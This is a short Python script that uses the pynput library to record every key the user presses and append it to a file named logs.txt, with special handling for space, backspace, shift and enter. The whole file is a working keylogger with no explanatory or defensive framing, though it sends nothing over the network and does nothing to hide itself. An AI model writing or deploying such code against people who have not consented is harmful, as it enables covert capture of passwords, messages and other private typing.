from pynput.keyboard import Key,Listener

def save_to_file(key):
    letter=str(key)
    letter=letter.replace("'","")
    if(letter=='Key.space'):
        letter=' '
    if(letter=='Key.backspace'):
        letter='<-'
    if(letter=='Key.shift_r' or letter=='Key.shift'):
        letter=''
    if(letter=='Key.enter'):
        letter='\n'
    with open('logs.txt','a') as f:
        f.write(letter)

with Listener(on_press=save_to_file) as l:
    l.join()